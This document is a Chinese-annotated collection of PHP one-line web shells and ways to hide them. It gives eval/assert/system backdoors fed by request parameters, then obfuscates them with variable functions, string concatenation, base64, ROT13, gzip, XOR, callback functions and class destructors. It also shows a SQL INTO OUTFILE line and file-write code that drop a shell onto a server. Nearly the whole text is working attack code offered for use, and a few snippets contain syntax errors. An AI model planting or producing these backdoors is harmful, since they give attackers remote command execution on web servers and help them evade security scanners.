// 修改命令获取方式
    <?php @eval($_COOKIE);?>
    <?php @eval($_GET);?>
    <?php @eval($_REQUEST);?>
    <?php @eval($_SESSION);?>

// 修改php代码包裹方式
    <script language="php"></script>
    // 以下为短标识 ，需要开启php.ini中的short_open_tag
    <% @eval($_POST['cmd']); %>  
    <? @eval($_POST['cmd']); ?>

// 修改php代码的命令执行函数
    <?php @assert($_POST['cmd']);?>
    <?php @system($_POST['cmd']);?>
    <?php @shell_exec($_POST['cmd']);?>
    <?php @passthru($_POST['cmd']);?>

    <?php 
    exec( $_POST['cmd'] , $result );
    print_r($result);
    ?>

    <?php
    $result = popen($_POST['cmd'], 'r');
    echo fread($result, 100);
    ?>

    <?php 
    $_cmd = $_POST['cmd'];
    echo `$_cmd`;
    ?>

// 使用变量函数
    <?php @$_POST['exec']($_POST['cmd']); ?>
    <?php
    $a = "eval";
    @$a($_POST['cmd']);
    ?>

// 使用变量函数配合可变变量进行混淆
    <?php
    $bb="eval";
    $a='bb';
    @$$aa($_POST['cmd']);
    ?>
    // $$aa = $($aa) = $ (‘bb’) = $bb = "eval"

// 使用变量函数配合字符串拼接进行混淆
    //直接拼接
    <?php
    $a = 'e'.'v'.'a'.'l';
    @$a($_POST['cmd']);
    ?>
    //Null拼接
    <?php
    $str1 = Null;
    $arg1 = $_GET['cmd'];
    eval($str1.$arg1);
    ?>
    //使用ASCII编码拼接
    <?php
    $a = chr(101).chr(118).chr(97).chr(108);
    @$a($_POST['cmd']);
    ?>
    // 大小写混淆 + 字符串翻转
    <?php
    $a = 'l'.'A'.'v'.'E';
    $b=strtolower($a);  
    $c=strrev($b); 
    @$c($_POST['cmd']);
    ?>
    // 使用pares_str函数混淆
    <?php
    $str="a=eval";
    parse_str($str);
    @$a($_POST['cmd']);
    ?>
    // 使用str_replace函数混淆
    <?php 
    $a = str_replace("test", "", "evtestal");
    @$a($_POST['cmd']);
    ?>
    // 使用substr_replace函数混淆
    <?php
    $a=substr_replace("evxx","al",2);
	@$a($_POST['cmd']);
    ?>
    // 使用preg_replace函数拼接
    <?php   
    function fun(){  
        return $_POST['cmd'];  
    }  
    @preg_replace("/test/e", fun(), "test123");  
    ?>
// 加入混淆信息 
    <?php
    function x()
    {
        return "/*sasas23123*/".$_POST['a']."/*sdfw3123*/";
    }
    eval(x());
    ?>
// 加解密混淆
    //base64 
    <?php
    $a=base64_decode("ZXZhbA==")
    @$a($_POST['cmd']);
    ?>

    <?php
    $a=base64_decode("ZXZhbA==")
    $payload='ZXZhbCgkX1BPU1RbYV0pOw==';
    decode_payload = @base64_decode($payload);
    @$a("/*sasas23123*/".decode_payload."/*sdfw3123*/");
    ?>
    
    //ROT13
    <?php
    $a = str_rot13('flfgrz'); 
    @$a($_POST['cmd']); 
    ?>

    //Gzip 
    <?php @eval(gzinflate(base64_decode('40pNzshXKMgoyMxLy9fQtFawtwMA')));?>

    //异或运算
    <?php
    $a = ('.'^']').('$'^']').('.'^']').('4'^'@').('8'^']').(']'^'0');   //f=system
    @$a($_POST['cmd']);
    ?>

// 写入文件
    //sql注入
    select '<?php @eval($_POST[cmd]);?>' into outfile '~/mysql-php/1.php'

    //文件读写
    <?php
    $a = strtr("abatme","me","em");      //$a = abatem
    $b = strtr($a,"ab","sy");       //$b = system（高危函数）
    $c = strtr('echo "<?php evqrw$_yKST['cmd'])?>" > ./shell.php',"qrwxyK","al(_PO");
    //$c = 'echo "<?php eval(_POST['cmd'])?>" > ./shell.php'
    @$b($c);  //将一句话木马内容写入同目录下的shell.php中
    ?>

// 利用函数和类包装
    // 利用自定义函数包装
    <?php
    function shyshy($a){
    assert($a);
    }
    @shyshy($_POST['cmd']);
    ?>

    // 利用自定义类
    <?php
    class Shell
    {
        var $arg;
        function setarg($str)
        {
            $this->arg = '' . $str . null;
        }
        function go()
        {
            eval("$this->arg");
        }
    }
    $run = new Shell;
    $run->setarg($_GET['cmd']);
    $run->go();
    ?>

    // 利用构造函数
    <?php 
    function go() 
    { 
    return "\x00".$_GET['cmd']."\x00"; 
    } 
    eval(go()); 
    ?>

    // 利用析构函数 
    <?php
    class Shell
    {
        public $arg = '';

        function __destruct()
        {
            eval("$this->arg");
        }
    }

    $run = new Shell;
    $run->arg = $_GET['cmd'];
    ?>
    // 使用回调函数
        // 使用create_function函数进行混淆
        <?php 
        $fun = create_function('',$_POST['shell']);
        $fun();
        ?>

        // 使用call_user_func函数进行混淆
        <?php
        @call_user_func(assert,$_POST['shell']);
        ?>

        // 使用array_map函数进行混淆
        <?php
        function fun() {
            $f =  chr(98-1).chr(116-1).chr(116-1).chr(103-2).chr(112+2).chr(110+6);
            return ''.$f;
        }
        $user = fun();    //拿到assert高危函数
        $pass =array($_POST['cmd']);
        array_map($user,$user = $pass );
        ?>